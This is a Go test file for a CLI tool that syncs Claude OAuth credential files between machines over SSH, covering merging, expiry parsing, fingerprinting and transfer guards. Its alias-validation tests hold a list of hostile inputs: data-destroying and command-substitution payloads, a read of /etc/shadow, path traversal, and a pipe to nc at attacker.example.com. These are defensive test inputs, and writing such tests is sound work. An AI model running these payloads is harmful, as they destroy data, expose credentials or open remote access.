package internal

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"
	"testing"
	"time"
)

// --- MergeCredentials -----------------------------------------------------

func TestMergeCredentials_PreservesDestMCP(t *testing.T) {
	dst := []byte(`{
		"claudeAiOauth": {"accessToken": "old-fake-token", "refreshToken": "old-fake-refresh"},
		"mcpOAuth": {
			"plugin:cloudflare:server|hash1": {"token": "fake1"},
			"plugin:figma:server|hash2": {"token": "fake2"},
			"plugin:sentry:server|hash3": {"token": "fake3"}
		},
		"someFutureKey": {"x": 1}
	}`)
	src := []byte(`{
		"claudeAiOauth": {"accessToken": "new-fake-token", "refreshToken": "new-fake-refresh"},
		"mcpOAuth": {"plugin:other:server|hash9": {"token": "fake9"}}
	}`)

	out, err := MergeCredentials(dst, src, false)
	if err != nil {
		t.Fatalf("MergeCredentials: %v", err)
	}

	var result map[string]json.RawMessage
	if err := json.Unmarshal(out, &result); err != nil {
		t.Fatalf("result does not parse as JSON: %v", err)
	}

	var oauth map[string]any
	if err := json.Unmarshal(result["claudeAiOauth"], &oauth); err != nil {
		t.Fatalf("claudeAiOauth does not parse: %v", err)
	}
	if oauth["accessToken"] != "new-fake-token" {
		t.Errorf("claudeAiOauth.accessToken = %v, want new-fake-token (src should win)", oauth["accessToken"])
	}

	var mcp map[string]any
	if err := json.Unmarshal(result["mcpOAuth"], &mcp); err != nil {
		t.Fatalf("mcpOAuth does not parse: %v", err)
	}
	if len(mcp) != 3 {
		t.Errorf("mcpOAuth has %d keys, want 3 (dst's, verbatim)", len(mcp))
	}
	for _, k := range []string{"plugin:cloudflare:server|hash1", "plugin:figma:server|hash2", "plugin:sentry:server|hash3"} {
		if _, ok := mcp[k]; !ok {
			t.Errorf("dst mcpOAuth key %q lost", k)
		}
	}
	if _, ok := mcp["plugin:other:server|hash9"]; ok {
		t.Errorf("src mcpOAuth key leaked into result without --include-mcp")
	}

	if _, ok := result["someFutureKey"]; !ok {
		t.Errorf("unknown top-level dst key was dropped")
	}
}

func TestMergeCredentials_IncludeMCPReplaces(t *testing.T) {
	dst := []byte(`{
		"claudeAiOauth": {"accessToken": "old"},
		"mcpOAuth": {"plugin:cloudflare:server|hash1": {"token": "fake1"}}
	}`)
	src := []byte(`{
		"claudeAiOauth": {"accessToken": "new"},
		"mcpOAuth": {"plugin:other:server|hash9": {"token": "fake9"}}
	}`)

	out, err := MergeCredentials(dst, src, true)
	if err != nil {
		t.Fatalf("MergeCredentials: %v", err)
	}
	var result map[string]json.RawMessage
	if err := json.Unmarshal(out, &result); err != nil {
		t.Fatalf("result does not parse: %v", err)
	}
	var mcp map[string]any
	if err := json.Unmarshal(result["mcpOAuth"], &mcp); err != nil {
		t.Fatalf("mcpOAuth does not parse: %v", err)
	}
	if len(mcp) != 1 {
		t.Fatalf("mcpOAuth has %d keys, want 1 (src's, replacing dst's)", len(mcp))
	}
	if _, ok := mcp["plugin:other:server|hash9"]; !ok {
		t.Errorf("--include-mcp should replace with src's mcpOAuth key set")
	}
	if _, ok := mcp["plugin:cloudflare:server|hash1"]; ok {
		t.Errorf("--include-mcp should have replaced (not merged) dst's mcpOAuth")
	}
}

func TestMergeCredentials_AbsentDest(t *testing.T) {
	src := []byte(`{"claudeAiOauth": {"accessToken": "new-fake-token"}}`)

	out, err := MergeCredentials(nil, src, false)
	if err != nil {
		t.Fatalf("MergeCredentials with absent dest: %v", err)
	}
	var result map[string]json.RawMessage
	if err := json.Unmarshal(out, &result); err != nil {
		t.Fatalf("result does not parse: %v", err)
	}
	if len(result) != 1 {
		t.Errorf("result has %d top-level keys, want 1 (claudeAiOauth only) -- the proven-good digrum3 shape, got: %s", len(result), out)
	}
	if _, ok := result["claudeAiOauth"]; !ok {
		t.Errorf("claudeAiOauth missing from result")
	}
	if _, ok := result["mcpOAuth"]; ok {
		t.Errorf("mcpOAuth should not appear when dest was absent and includeMCP=false")
	}
}

func TestMergeCredentials_SourceMissingOauthErrors(t *testing.T) {
	if _, err := MergeCredentials(nil, []byte(`{"mcpOAuth": {}}`), false); err == nil {
		t.Error("expected an error when source has no claudeAiOauth key")
	}
}

// --- CredSnapshot / ms-epoch parsing --------------------------------------

func TestCredSnapshot_MillisEpoch(t *testing.T) {
	want := time.Date(2026, 8, 8, 19, 27, 0, 0, time.UTC)
	data := fmt.Sprintf(`{"claudeAiOauth":{"expiresAt":%d,"refreshTokenExpiresAt":%d,"refreshToken":"fake-refresh-token"}}`,
		want.UnixMilli(), want.Add(30*24*time.Hour).UnixMilli())

	snap, err := parseCredSnapshot([]byte(data), time.Time{})
	if err != nil {
		t.Fatalf("parseCredSnapshot: %v", err)
	}
	if !snap.ExpiresAt.Equal(want) {
		t.Errorf("ExpiresAt = %v, want %v", snap.ExpiresAt, want)
	}
	if snap.RefreshExp.Before(want) {
		t.Errorf("RefreshExp should be after ExpiresAt")
	}
}

func TestCredSnapshot_SecondsEpochRejectedNotSilentlyRead1970(t *testing.T) {
	// A seconds-epoch value (~1.7 billion) misread as milliseconds decodes to
	// a handful of weeks into January 1970 -- exactly the silent-misparse this
	// guards against.
	secondsEpoch := time.Now().Unix()
	data := fmt.Sprintf(`{"claudeAiOauth":{"expiresAt":%d,"refreshToken":"fake"}}`, secondsEpoch)

	snap, err := parseCredSnapshot([]byte(data), time.Time{})
	if err != nil {
		t.Fatalf("parseCredSnapshot should not hard-fail on a bad epoch, got: %v", err)
	}
	if !snap.ExpiresAt.IsZero() {
		t.Errorf("a seconds-epoch value must be rejected (left zero), not silently read as %v", snap.ExpiresAt)
	}
	if snap.ExpiresAt.Year() == 1970 {
		t.Errorf("ExpiresAt must never silently land in 1970")
	}
}

// --- fingerprint ------------------------------------------------------------

func TestFingerprint_IsNotTheSecret(t *testing.T) {
	token := "sk-ant-oat01-totally-fake-refresh-token-value-for-testing-only"
	fp := fingerprint(token)

	if len(fp) != 12 {
		t.Fatalf("fingerprint length = %d, want 12", len(fp))
	}
	if _, err := hex.DecodeString(fp); err != nil {
		t.Fatalf("fingerprint is not hex: %v", err)
	}
	if strings.Contains(fp, token) {
		t.Fatalf("fingerprint must not embed the raw token")
	}

	snap := CredSnapshot{Present: true, Fingerprint: fp, ExpiresAt: time.Now().Add(time.Hour), RefreshExp: time.Now().Add(48 * time.Hour)}
	line := formatSnapshotLine(snap)
	if strings.Contains(line, token) {
		t.Fatalf("rendered status line leaked the raw token: %s", line)
	}
}

// --- remote path composition ------------------------------------------------

func TestRemoteCredPath(t *testing.T) {
	// Default config path.
	peer := &FleetPeer{Host: "macos"}
	got := remoteCredPath(peer, "digrum2")
	want := "~/.claude-profiles/digrum2/.credentials.json"
	if got != want {
		t.Errorf("remoteCredPath(default) = %q, want %q", got, want)
	}

	// Custom config_path honored.
	peer2 := &FleetPeer{Host: "macos", ConfigPath: "/opt/cpm/config.toml"}
	got2 := remoteCredPath(peer2, "digrum2")
	if !strings.HasPrefix(got2, "/opt/cpm/digrum2/") {
		t.Errorf("remoteCredPath(custom) = %q, want prefix /opt/cpm/digrum2/", got2)
	}

	// A Windows-style peer config_path must never be filepath.Dir'd locally
	// (that mangles it on a non-Windows control machine) -- splitting on
	// EITHER separator and always joining the tail with "/" is the contract.
	peerWin := &FleetPeer{Host: "desktop", ConfigPath: `C:\Users\x\.claude-profiles\config.toml`}
	gotWin := remoteCredPath(peerWin, "digrum2")
	if strings.Contains(gotWin, `\digrum2\`) {
		t.Errorf("remoteCredPath must join alias/.credentials.json with '/', got %q", gotWin)
	}
	if !strings.HasSuffix(gotWin, "/digrum2/.credentials.json") {
		t.Errorf("remoteCredPath(windows peer) = %q, want suffix /digrum2/.credentials.json", gotWin)
	}
}

// --- no-secret-in-argv: the FLEET.md invariant, made executable -----------

func TestBuildRemoteWriteCmd_NoSecretInArgv(t *testing.T) {
	sentinel := "sk-ant-oat01-SENTINEL-VALUE-MUST-NEVER-APPEAR-IN-ARGV"
	peer := &FleetPeer{Host: "macos"}
	dir := remoteProfileDir(peer, "digrum2")
	remoteCmd := pushRemoteCmd(dir)
	payload := []byte(fmt.Sprintf(`{"claudeAiOauth":{"refreshToken":%q}}`, sentinel))

	cmd := buildSecretPipeCmd(peer.Host, remoteCmd, payload)

	for i, a := range cmd.Args {
		if strings.Contains(a, sentinel) {
			t.Fatalf("sentinel leaked into cmd.Args[%d] = %q", i, a)
		}
	}
	if strings.Contains(remoteCmd, sentinel) {
		t.Fatalf("sentinel leaked into the remoteCmd string itself: %q", remoteCmd)
	}

	stdinBytes, err := io.ReadAll(cmd.Stdin)
	if err != nil {
		t.Fatalf("reading cmd.Stdin: %v", err)
	}
	if !strings.Contains(string(stdinBytes), sentinel) {
		t.Fatalf("sentinel should be present on stdin (that's the only sanctioned transport), got: %s", stdinBytes)
	}
}

// --- transferDecision / Gate B (the push/pull guards) ----------------------

func TestPlanTransfer_Guards(t *testing.T) {
	now := time.Now()
	cases := []struct {
		name         string
		src, dst     CredSnapshot
		includeMCP   bool
		wantAllowed  bool
		wantBlocking bool
		wantRoutine  bool
	}{
		{
			name:         "destination absent -- plain write",
			src:          CredSnapshot{Present: true, ExpiresAt: now.Add(3 * time.Hour), RefreshExp: now.Add(48 * time.Hour), Fingerprint: "aaaaaaaaaaaa"},
			dst:          CredSnapshot{Present: false},
			wantAllowed:  true,
			wantBlocking: false,
			wantRoutine:  false,
		},
		{
			name:        "source absent -- nothing to do",
			src:         CredSnapshot{Present: false},
			dst:         CredSnapshot{Present: true},
			wantAllowed: false,
		},
		{
			// Gate B(b1): destination is strictly newer.
			name:         "destination newer -- refused",
			src:          CredSnapshot{Present: true, ExpiresAt: now.Add(1 * time.Hour), RefreshExp: now.Add(48 * time.Hour), Fingerprint: "aaaaaaaaaaaa"},
			dst:          CredSnapshot{Present: true, ExpiresAt: now.Add(3 * time.Hour), RefreshExp: now.Add(48 * time.Hour), Fingerprint: "bbbbbbbbbbbb"},
			wantAllowed:  false,
			wantBlocking: true,
		},
		{
			// Gate B(b2): source refresh token already dead. This is the
			// scenario that fires on the real fleet for `digrum` today.
			name:         "source refresh token expired -- refused",
			src:          CredSnapshot{Present: true, ExpiresAt: now.Add(1 * time.Hour), RefreshExp: now.Add(-time.Hour), Fingerprint: "aaaaaaaaaaaa"},
			dst:          CredSnapshot{Present: true, ExpiresAt: now.Add(-2 * time.Hour), RefreshExp: now.Add(-48 * time.Hour), Fingerprint: "bbbbbbbbbbbb"},
			wantAllowed:  false,
			wantBlocking: true,
		},
		{
			name:         "same lineage, older destination -- routine overwrite",
			src:          CredSnapshot{Present: true, ExpiresAt: now.Add(3 * time.Hour), RefreshExp: now.Add(48 * time.Hour), Fingerprint: "aaaaaaaaaaaa"},
			dst:          CredSnapshot{Present: true, ExpiresAt: now.Add(1 * time.Hour), RefreshExp: now.Add(24 * time.Hour), Fingerprint: "aaaaaaaaaaaa"},
			wantAllowed:  true,
			wantBlocking: false,
			wantRoutine:  true,
		},
		{
			name:         "divergent lineage, older destination -- still routine (not silently refused)",
			src:          CredSnapshot{Present: true, ExpiresAt: now.Add(3 * time.Hour), RefreshExp: now.Add(48 * time.Hour), Fingerprint: "aaaaaaaaaaaa"},
			dst:          CredSnapshot{Present: true, ExpiresAt: now.Add(1 * time.Hour), RefreshExp: now.Add(24 * time.Hour), Fingerprint: "bbbbbbbbbbbb"},
			wantAllowed:  true,
			wantBlocking: false,
			wantRoutine:  true,
		},
		{
			// Gate B(b3): --include-mcp would delete a dest-only MCP grant.
			name:         "include-mcp clobbers dest-only grant -- refused",
			src:          CredSnapshot{Present: true, ExpiresAt: now.Add(3 * time.Hour), RefreshExp: now.Add(48 * time.Hour), Fingerprint: "aaaaaaaaaaaa", MCPKeys: nil},
			dst:          CredSnapshot{Present: true, ExpiresAt: now.Add(1 * time.Hour), RefreshExp: now.Add(24 * time.Hour), Fingerprint: "aaaaaaaaaaaa", MCPKeys: []string{"plugin:x:y|hash"}},
			includeMCP:   true,
			wantAllowed:  false,
			wantBlocking: true,
		},
		{
			name:         "include-mcp with identical grant sets -- allowed",
			src:          CredSnapshot{Present: true, ExpiresAt: now.Add(3 * time.Hour), RefreshExp: now.Add(48 * time.Hour), Fingerprint: "aaaaaaaaaaaa", MCPKeys: []string{"plugin:x:y|hash"}},
			dst:          CredSnapshot{Present: true, ExpiresAt: now.Add(1 * time.Hour), RefreshExp: now.Add(24 * time.Hour), Fingerprint: "aaaaaaaaaaaa", MCPKeys: []string{"plugin:x:y|hash"}},
			includeMCP:   true,
			wantAllowed:  true,
			wantRoutine:  true,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := planTransfer(tc.src, tc.dst, tc.includeMCP)
			if d.Allowed != tc.wantAllowed {
				t.Errorf("Allowed = %v, want %v (reason: %s)", d.Allowed, tc.wantAllowed, d.Reason)
			}
			if d.Blocking != tc.wantBlocking {
				t.Errorf("Blocking = %v, want %v (reason: %s)", d.Blocking, tc.wantBlocking, d.Reason)
			}
			if d.Allowed && d.Routine != tc.wantRoutine {
				t.Errorf("Routine = %v, want %v (reason: %s)", d.Routine, tc.wantRoutine, d.Reason)
			}
		})
	}
}

// --- arg validation / shared-identity refusal / peer resolution -----------

func TestValidateCredSyncArgs(t *testing.T) {
	if err := validateCredSyncArgs(nil, CredSyncOpts{}); err == nil {
		t.Error("neither aliases nor --all should error")
	}
	if err := validateCredSyncArgs([]string{"a"}, CredSyncOpts{All: true}); err == nil {
		t.Error("both aliases and --all should error")
	}
	if err := validateCredSyncArgs([]string{"a"}, CredSyncOpts{}); err != nil {
		t.Errorf("aliases alone should not error: %v", err)
	}
	if err := validateCredSyncArgs(nil, CredSyncOpts{All: true}); err != nil {
		t.Errorf("--all alone should not error: %v", err)
	}
}

func TestRefuseSharedIdentity(t *testing.T) {
	if err := refuseSharedIdentity("default"); err == nil {
		t.Error("the shared \"default\" identity must be refused")
	}
	if err := refuseSharedIdentity("digrum1"); err != nil {
		t.Errorf("a normal alias must not be refused: %v", err)
	}
}

func TestResolvePeers(t *testing.T) {
	f := &FleetConfig{Peers: map[string]*FleetPeer{
		"macbook": {Host: "h1"},
		"desktop": {Host: "h2"},
	}}
	all, err := resolvePeers(f, nil)
	if err != nil || len(all) != 2 {
		t.Fatalf("resolvePeers(nil) = %v, %v", all, err)
	}
	one, err := resolvePeers(f, []string{"macbook"})
	if err != nil || len(one) != 1 || one[0] != "macbook" {
		t.Fatalf("resolvePeers([macbook]) = %v, %v", one, err)
	}
	if _, err := resolvePeers(f, []string{"nope"}); err == nil {
		t.Error("unknown peer should error")
	}
}

func TestResolveAllAliasesExcludesDefault(t *testing.T) {
	cfg := &Config{Profiles: map[string]*Profile{
		"digrum1": {}, "bdaya": {}, "default": {},
	}}
	got := resolveAllAliases(cfg)
	for _, a := range got {
		if a == "default" {
			t.Errorf("resolveAllAliases must exclude the shared \"default\" identity, got %v", got)
		}
	}
	if len(got) != 2 {
		t.Errorf("resolveAllAliases = %v, want 2 entries (digrum1, bdaya)", got)
	}
}

// --- sentinel exit code interpretation (read + write) ----------------------

func TestInterpretRemoteReadResult(t *testing.T) {
	// exit 0 with valid JSON -> parsed, Present=true.
	snap, err := interpretRemoteReadResult([]byte(`{"claudeAiOauth":{"refreshToken":"fake"}}`), "", 0)
	if err != nil {
		t.Fatalf("exit 0: unexpected error: %v", err)
	}
	if !snap.Present || snap.Fingerprint == "" {
		t.Errorf("exit 0: snap = %+v, want Present with a fingerprint", snap)
	}

	// exit sentinel (3) -> absent, no error.
	snap2, err := interpretRemoteReadResult(nil, "", sshExitAbsent)
	if err != nil {
		t.Fatalf("exit %d: unexpected error: %v", sshExitAbsent, err)
	}
	if snap2.Present {
		t.Errorf("exit %d should mean Present=false", sshExitAbsent)
	}

	// any other nonzero with stderr -> surfaced verbatim.
	_, err = interpretRemoteReadResult(nil, "permission denied", 1)
	if err == nil || !strings.Contains(err.Error(), "permission denied") {
		t.Errorf("expected stderr to be surfaced, got: %v", err)
	}

	// any other nonzero with EMPTY stderr -> still a non-nil, informative error.
	_, err = interpretRemoteReadResult(nil, "", 42)
	if err == nil || !strings.Contains(err.Error(), "42") {
		t.Errorf("expected exit code in error when stderr is empty, got: %v", err)
	}
}

func TestInterpretRemoteWriteResult(t *testing.T) {
	if err := interpretRemoteWriteResult("digrum2", "macbook", "", 0); err != nil {
		t.Errorf("exit 0 should be success, got: %v", err)
	}
	err := interpretRemoteWriteResult("digrum2", "macbook", "", sshExitDirAbsent)
	if err == nil || !strings.Contains(err.Error(), "cpm fleet sync") {
		t.Errorf("exit %d should hint at 'cpm fleet sync', got: %v", sshExitDirAbsent, err)
	}
	err2 := interpretRemoteWriteResult("digrum2", "macbook", "disk full", 1)
	if err2 == nil || !strings.Contains(err2.Error(), "disk full") {
		t.Errorf("expected stderr surfaced, got: %v", err2)
	}
}

// --- doctor.go / GetCredentialInfo regression, via a fixture file ---------

func TestFingerprintDeterministic(t *testing.T) {
	a := fingerprint("fake-refresh-token-abc")
	b := fingerprint("fake-refresh-token-abc")
	c := fingerprint("fake-refresh-token-xyz")
	if a != b {
		t.Errorf("fingerprint must be deterministic: %q != %q", a, b)
	}
	if a == c {
		t.Errorf("different tokens must not collide: %q == %q", a, c)
	}
}

// --- ValidateAlias enforcement at the fleet-creds call sites ---------------
//
// The alias is embedded UNQUOTED into every remote shell/PowerShell command
// these verbs build (readRemoteCmd, pushRemoteCmd, FleetCredsVerify's
// launcher), and is also fed to filepath.Join(profilesBase, alias) for the
// local side. An unvalidated alias containing shell metacharacters is
// command injection (RCE on the peer, as the SSH user that owns every
// .credentials.json file); an alias containing ".." is a path-traversal
// read/write. aliasRe forbids the whole class at once (only
// [a-zA-Z0-9][a-zA-Z0-9_-]* is accepted -- no space, quote, `$`, backtick,
// `;`, `|`, `&`, `.`, or `/`), so ValidateAlias is the single guard that
// closes both.
//
// These aliases are deliberately chosen so every one fails ValidateAlias
// AND, if it ever reached a remote command unguarded, would be a live
// injection/traversal payload.
var maliciousCredsAliases = []string{
	"a; rm -rf ~",                  // command chaining
	"$(whoami)",                    // command substitution
	"`id`",                         // backtick substitution
	"a && cat /etc/shadow",         // command chaining
	"../../etc/passwd",             // path traversal
	"a|nc attacker.example.com 4444", // pipe to a listener
}

// captureStdout redirects os.Stdout for the duration of fn and returns
// everything written to it. The fleet-creds verbs report per-alias/per-peer
// outcomes via fmt.Printf rather than a return value, so this is the only
// way to assert "X was never attempted" for them.
func captureStdout(t *testing.T, fn func()) string {
	t.Helper()
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatalf("os.Pipe: %v", err)
	}
	orig := os.Stdout
	os.Stdout = w
	fn()
	w.Close()
	os.Stdout = orig
	var buf bytes.Buffer
	if _, err := io.Copy(&buf, r); err != nil {
		t.Fatalf("reading captured stdout: %v", err)
	}
	return buf.String()
}

// TestFleetCredsStatus_RejectsInvalidAliasBeforeAnyRead exercises the real
// FleetCredsStatus entry point (not just ValidateAlias in isolation) with a
// configured-but-unreachable peer: a malicious alias must be rejected before
// ReadLocalCredSnapshot (a LOCAL file read off filepath.Join(profilesBase,
// alias) -- the traversal side of this bug) or the per-peer loop ever runs.
func TestFleetCredsStatus_RejectsInvalidAliasBeforeAnyRead(t *testing.T) {
	cfg := &Config{Fleet: &FleetConfig{Peers: map[string]*FleetPeer{
		"macbook": {Host: "cpm-test-nonexistent-host.invalid"},
	}}}
	out := captureStdout(t, func() {
		if err := FleetCredsStatus(cfg, "", maliciousCredsAliases, CredSyncOpts{}); err != nil {
			t.Fatalf("FleetCredsStatus returned error: %v", err)
		}
	})
	for _, alias := range maliciousCredsAliases {
		if !strings.Contains(out, alias+"\n  ERROR: invalid alias") {
			t.Errorf("expected %q to be rejected by ValidateAlias, got output:\n%s", alias, out)
		}
	}
	if strings.Contains(out, "local    ") {
		t.Errorf("a rejected alias must never reach ReadLocalCredSnapshot (no \"local\" line should print), got:\n%s", out)
	}
	if strings.Contains(out, "macbook") {
		t.Errorf("a rejected alias must never reach the per-peer loop, got:\n%s", out)
	}
}

// TestFleetCredsPush_RejectsInvalidAlias covers the CLI-argument attack
// surface: `cpm fleet creds push '$(whoami)'`. --yes bypasses the
// non-interactive-stdin gate so the alias loop is reached; the peer is
// deliberately unreachable, but that must never matter -- the guard has to
// fire before the per-peer stage even starts.
func TestFleetCredsPush_RejectsInvalidAlias(t *testing.T) {
	cfg := &Config{Fleet: &FleetConfig{Peers: map[string]*FleetPeer{
		"macbook": {Host: "cpm-test-nonexistent-host.invalid"},
	}}}
	out := captureStdout(t, func() {
		if err := FleetCredsPush(cfg, "", maliciousCredsAliases, CredSyncOpts{Yes: true}); err != nil {
			t.Fatalf("FleetCredsPush returned error: %v", err)
		}
	})
	for _, alias := range maliciousCredsAliases {
		if !strings.Contains(out, alias+": invalid alias") {
			t.Errorf("expected %q to be rejected by ValidateAlias, got output:\n%s", alias, out)
		}
	}
	if strings.Contains(out, "-> peer") {
		t.Errorf("a rejected alias must never reach the per-peer push stage, got:\n%s", out)
	}
}

// TestFleetCredsPush_RejectsInvalidAliasSourcedFromConfig covers the second
// attack surface the finding calls out: --all resolves targets from
// cfg.Profiles keys (resolveAllAliases), which can arrive already-merged
// from a synced config.toml with no ValidateAlias applied at that point
// either. The per-alias guard inside FleetCredsPush must catch it exactly
// the same way regardless of whether the alias came from argv or from
// config.
func TestFleetCredsPush_RejectsInvalidAliasSourcedFromConfig(t *testing.T) {
	cfg := &Config{
		Profiles: map[string]*Profile{
			"a; rm -rf ~": {},
			"good-alias":  {},
		},
		Fleet: &FleetConfig{Peers: map[string]*FleetPeer{
			"macbook": {Host: "cpm-test-nonexistent-host.invalid"},
		}},
	}
	out := captureStdout(t, func() {
		if err := FleetCredsPush(cfg, "", nil, CredSyncOpts{All: true, Yes: true}); err != nil {
			t.Fatalf("FleetCredsPush returned error: %v", err)
		}
	})
	if !strings.Contains(out, "a; rm -rf ~: invalid alias") {
		t.Errorf("a malicious alias sourced from cfg.Profiles (via --all) must be rejected too, got:\n%s", out)
	}
}

// TestFleetCredsPush_SharedIdentityGuardStillRunsAfterAliasGuard pins the
// ordering: ValidateAlias now runs first, but "default" is itself a
// syntactically valid alias, so refuseSharedIdentity must still fire right
// after it -- the new guard must not accidentally swallow or short-circuit
// the existing one.
func TestFleetCredsPush_SharedIdentityGuardStillRunsAfterAliasGuard(t *testing.T) {
	cfg := &Config{Fleet: &FleetConfig{Peers: map[string]*FleetPeer{
		"macbook": {Host: "cpm-test-nonexistent-host.invalid"},
	}}}
	out := captureStdout(t, func() {
		if err := FleetCredsPush(cfg, "", []string{"default"}, CredSyncOpts{Yes: true}); err != nil {
			t.Fatalf("FleetCredsPush returned error: %v", err)
		}
	})
	if !strings.Contains(out, "never touches the shared") {
		t.Errorf("refuseSharedIdentity must still fire for \"default\" after the alias-validity guard, got:\n%s", out)
	}
	if strings.Contains(out, "-> peer") {
		t.Errorf("\"default\" must never reach the per-peer push stage, got:\n%s", out)
	}
}

// TestFleetCredsVerify_RejectsInvalidAlias covers the fourth call site:
// FleetCredsVerify concatenates alias directly into the "claude-<alias>"
// launcher name and into the remote command string. The guard must fire
// before the peer lookup/PeerReachable check, so this must return
// ValidateAlias's error, never an SSH/network error, even against an
// unreachable peer.
func TestFleetCredsVerify_RejectsInvalidAlias(t *testing.T) {
	cfg := &Config{Fleet: &FleetConfig{Peers: map[string]*FleetPeer{
		"macbook": {Host: "cpm-test-nonexistent-host.invalid"},
	}}}
	for _, alias := range maliciousCredsAliases {
		t.Run(alias, func(t *testing.T) {
			err := FleetCredsVerify(cfg, "", "macbook", alias)
			if err == nil {
				t.Fatalf("FleetCredsVerify(%q) = nil error, want a rejection", alias)
			}
			if !strings.Contains(err.Error(), "invalid alias") {
				t.Fatalf("FleetCredsVerify(%q) error = %q, want ValidateAlias's rejection (a different error means the guard was bypassed and the code went on to touch the peer)", alias, err.Error())
			}
		})
	}
}

func TestRemoteBinDir(t *testing.T) {
	cases := []struct{ in, want string }{
		{"", ""},                                 // no configured cpm path
		{"cpm", ""},                              // bare name resolved on PATH
		{"~/dev/bin/cpm", "$HOME/dev/bin"},       // the live macbook shape (root-owned ~/.local)
		{"~/cpm", "$HOME"},                       // home-root binary
		{"/usr/local/bin/cpm", "/usr/local/bin"}, // absolute POSIX path
		{`C:\tools\cpm.exe`, "C:/tools"},         // windows separators normalized
		{"  ~/dev/bin/cpm  ", "$HOME/dev/bin"},   // surrounding whitespace trimmed
	}
	for _, c := range cases {
		if got := remoteBinDir(c.in); got != c.want {
			t.Errorf("remoteBinDir(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}
